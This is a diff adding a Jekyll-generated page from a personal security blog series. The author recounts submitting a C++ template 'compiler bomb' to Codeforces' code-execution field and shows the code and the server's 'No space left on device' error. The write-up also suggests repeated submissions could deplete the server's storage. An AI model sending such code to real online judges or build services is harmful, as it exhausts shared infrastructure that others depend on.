@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="How it all started!">
+<meta name="keywords" content=" start">
+<title>The Start | Documentation for vulnerabilties found by Khaled Mohamed</title>
+<link rel="stylesheet" href="css/syntax.css">
+
+
+<link rel="stylesheet" type="text/css" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css">
+<!--<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">-->
+<link rel="stylesheet" href="css/modern-business.css">
+<link rel="stylesheet" href="css/lavish-bootstrap.css">
+<link rel="stylesheet" href="css/customstyles.css">
+<link rel="stylesheet" href="css/theme-blue.css">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+<script src="js/jquery.navgoco.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/2.0.0/anchor.min.js"></script>
+<script src="js/toc.js"></script>
+<script src="js/customscripts.js"></script>
+<link rel="shortcut icon" href="images/favicon.ico">
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<link rel="alternate" type="application/rss+xml" title="" href="http://localhost:4000/feed.xml">
+
+    <script>
+        $(document).ready(function() {
+            // Initialize navgoco with default options
+            $("#mysidebar").navgoco({
+                caretHtml: '',
+                accordion: true,
+                openClass: 'active', // open
+                save: false, // leave false or nav highlighting doesn't work right
+                cookie: {
+                    name: 'navgoco',
+                    expires: false,
+                    path: '/'
+                },
+                slide: {
+                    duration: 400,
+                    easing: 'swing'
+                }
+            });
+
+            $("#collapseAll").click(function(e) {
+                e.preventDefault();
+                $("#mysidebar").navgoco('toggle', false);
+            });
+
+            $("#expandAll").click(function(e) {
+                e.preventDefault();
+                $("#mysidebar").navgoco('toggle', true);
+            });
+
+        });
+
+    </script>
+    <script>
+        $(document.links).filter(function() {
+    return this.hostname != window.location.hostname;
+        }).attr('target', '_blank');
+    </script>
+    <script>
+        $(function () {
+            $('[data-toggle="tooltip"]').tooltip()
+        })
+    </script>
+    <script>
+        $(document).ready(function() {
+            $("#tg-sb-link").click(function() {
+                $("#tg-sb-sidebar").toggle();
+                $("#tg-sb-content").toggleClass('col-md-9');
+                $("#tg-sb-content").toggleClass('col-md-12');
+                $("#tg-sb-icon").toggleClass('fa-toggle-on');
+                $("#tg-sb-icon").toggleClass('fa-toggle-off');
+            });
+        });
+    </script>
+    
+
+</head>
+<body>
+<!-- Navigation -->
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="container topnavlinks">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="fa fa-home fa-lg navbar-brand" href="index.html">&nbsp;<span class="projectTitle"> Breaking Down</span></a>
+        </div>
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <!-- toggle sidebar button -->
+                <li><a id="tg-sb-link" href="#"><i id="tg-sb-icon" class="fa fa-toggle-on"></i> Nav</a></li>
+                <!-- entries without drop-downs appear here -->
+                
+                
+                
+                <li><a href="https://github.com/Ex-o" target="_blank">GitHub</a></li>
+                
+                
+                
+                <li><a href="https://cp.fayox.com" target="_blank">Competitive Programming Community</a></li>
+                
+                
+                
+                <li><a href="contact.html">Contact Me</a></li>
+                
+                
+                
+                <!-- entries with drop-downs appear here -->
+                <!-- conditional logic to control which topnav appears for the audience defined in the configuration file.-->
+                
+                
+                
+                <!--
+			<li>
+
+
+
+  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the The Start page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>
+
+</li>
+
+		
+                <!--comment out this block if you want to hide search-->
+                <!--li>
+                    <start search>
+                    <div id="search-demo-container">
+                        <input type="text" id="search-input" placeholder="search...">
+                        <ul id="results-container"></ul>
+                    </div>
+                    <script src="js/jekyll-search.js" type="text/javascript"></script>
+                    <script type="text/javascript">
+                            SimpleJekyllSearch.init({
+                                searchInput: document.getElementById('search-input'),
+                                resultsContainer: document.getElementById('results-container'),
+                                dataSource: 'search.json',
+                                searchResultTemplate: '<li><a href="{url}" title="The Start">{title}</a></li>',
+                    noResultsText: 'No results found.',
+                            limit: 10,
+                            fuzzy: true,
+                    })
+                    </script>
+                    <!--end search>
+                </li-->
+            </ul>
+        </div>
+        </div>
+        <!-- /.container -->
+</nav>
+
+<!-- Page Content -->
+<div class="container">
+    <div class="col-lg-12">&nbsp;</div>
+    <!-- Content Row -->
+    <div class="row">
+        
+        
+            <!-- Sidebar Column -->
+            <div class="col-md-3" id="tg-sb-sidebar">
+                
+
+
+
+
+
+
+
+
+
+
+
+
+<ul id="mysidebar" class="nav">
+    <li class="sidebarTitle"> </li>
+    
+    
+    
+        
+    
+    <li>
+        <a href="#">Overview</a>
+        <ul>
+            
+            
+            
+            <li><a href="index.html">Introduction</a></li>
+            
+            
+            
+            
+        </ul>
+     </li>
+       
+        
+    
+    <li>
+        <a href="#">Breaking Down Series</a>
+        <ul>
+            
+            
+            
+            <li><a href="breakingdown_start.html">The Start</a></li>
+            
+            
+            
+            
+            
+            
+            <li><a href="breakingdown_dig.html">The Dig</a></li>
+            
+            
+            
+            
+        </ul>
+     </li>
+       
+        
+        
+        <!-- if you aren't using the accordion, uncomment this block:
+           <p class="external">
+               <a href="#" id="collapseAll">Collapse All</a> | <a href="#" id="expandAll">Expand All</a>
+           </p>
+           -->
+</ul>
+
+<!-- this highlights the active parent class in the navgoco sidebar. this is critical so that the parent expands when you're viewing a page. This must appear below the sidebar code above. Otherwise, if placed inside customscripts.js, the script runs before the sidebar code runs and the class never gets inserted.-->
+<script>$("li.active").parents('li').toggleClass("active");</script>
+
+            </div>
+            
+        
+
+        <!-- Content Column -->
+        <div class="col-md-9" id="tg-sb-content">
+            <div class="post-header">
+   <h1 class="post-title-main">The Start</h1>
+</div>
+
+
+
+<div class="post-content">
+
+   
+    <div class="summary">How it all started!</div>
+   
+
+    
+    
+<!-- this handles the automatic toc. use ## for subheads to auto-generate the on-page minitoc. if you use html tags, you must supply an ID for the heading element in order for it to appear in the minitoc. -->
+<script>
+$( document ).ready(function() {
+  // Handler for .ready() called.
+
+$('#toc').toc({ minimumHeaders: 0, listType: 'ul', showSpeed: 0, headers: 'h2,h3,h4' });
+
+/* this offset helps account for the space taken up by the floating toolbar. */
+$('#toc').on('click', 'a', function() {
+  var target = $(this.getAttribute('href'))
+    , scroll_target = target.offset().top
+
+  $(window).scrollTop(scroll_target - 10);
+  return false
+})
+  
+});
+</script>
+
+<div id="toc"></div>
+
+    
+
+
+    
+
+  <h2 id="prolouge">Prolouge:</h2>
+
+<p>It was a quiet night and I had just woken up from a not very comfortable sleep. As always, I open up Codeforces.com and check what people are saying and look for a problem to solve. However, something was different. I was very irritated, I had failed to solve one dynamic programming challenge and I was pissed off. It was time for codeofrces to be put to rest. Or so I thought.</p>
+
+<h2 id="epilouge">Epilouge:</h2>
+
+<p>Codeforces is the biggest programming contests platform right now, but that didn’t matter. To me, codeforces was just software that ran untrusted code. I saw an opportunity. I write some code and they run it ON THEIR MACHINES! I thought to myself, how hard could it be to break this website when I hypothetically could feed the host with all the bad stuff you can think of? I was a naive but not far from the truth.</p>
+
+<p>For some context, codeforces has a field that let’s you send some code after specifying in which language/compiler your code wants to use and it’s compiled and then ran on some server and you’re passed the response to see. Basic stuff that online judges do.</p>
+
+<figure><a class="no_icon" target="_blank" href="https://codeforces.com/problemset/customtestm"><img class="docimage" src="images/cf_codearea.png" alt="codearea" /></a><figcaption>Codeforces' Code Area</figcaption></figure>
+
+<p>The first thing that came to my mind was trying to break the compiler. I remembered an article I had read about compiler bombs and decided to try that and see if they had correct compiler flags that could prevent such a trivial problem from occuring and to my surprise: they did not!</p>
+
+<div class="language-cpp highlighter-rouge"><pre class="highlight"><code><span class="cp">#define Z struct X
+#define T template &lt;int N
+</span><span class="n">T</span><span class="p">,</span> <span class="kt">int</span> <span class="n">M</span> <span class="o">=</span> <span class="n">N</span> <span class="o">&gt;</span> <span class="n">Z</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">Y</span> <span class="p">{</span>
+	<span class="k">static</span> <span class="kt">int</span> <span class="n">f</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">};</span>
+
+<span class="n">T</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">,</span> <span class="mi">0</span> <span class="o">&gt;:</span> <span class="n">Y</span> <span class="p">{};</span>
+<span class="n">T</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">N</span> <span class="o">&gt;:</span> <span class="n">Y</span> <span class="p">{};</span>
+<span class="n">T</span><span class="p">,</span> <span class="kt">int</span> <span class="n">M</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="p">{</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="n">f</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">static</span> <span class="kt">int</span> <span class="n">x</span><span class="p">[</span><span class="mi">100000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="n">X</span> <span class="o">&lt;</span> <span class="n">N</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span>
+			<span class="n">M</span> <span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">()</span> <span class="o">+</span> <span class="n">X</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">,</span>
+			<span class="n">M</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">()</span>
+	<span class="p">};</span>
+<span class="p">}</span>
+<span class="p">};</span>
+<span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">X</span> <span class="o">&lt;</span><span class="mi">80</span><span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">();</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre>
+</div>
+
+<p>The idea behind this was that I knew the above code generated a huge object file by creating too many segments(more than 2^16 - 1) and that the server where this code was compiled had to have some sort of size limit. I was both right and wrong. After sending the code to the server I got a return that said:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Can't compile file:
+C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Assembler messages:
+C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: cannot fill 256 bytes in section .data$_ZZN1XILi76ELi76EE1fEvE1x of C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o because: 'No space left on device'
+C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: can't close C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o: No space left on device
+</code></pre>
+</div>
+
+<p>Which was good that I was able to hault the checker from cleaning the temp files and now I can just keep sending codes to somehow deplete the server’s storage. That was too lame and I had to dig deeper.</p>
+
+
+    <div class="tags">
+        
+    </div>
+
+
+</div>
+
+<hr class="shaded"/>
+
+<footer>
+            <div class="row">
+                <div class="col-lg-12 footer">
+               &copy;2018 Khaled Mohamed. All rights reserved. <br />
+ Site last updated: Aug 24, 2018 <br />
+<p><!--img src="images/company_logo.png" alt="Company logo"/--></p>
+                </div>
+            </div>
+</footer>
+
+
+        </div>
+    <!-- /.row -->
+</div>
+<!-- /.container -->
+    </div>
+
+</body>
+
+</html>
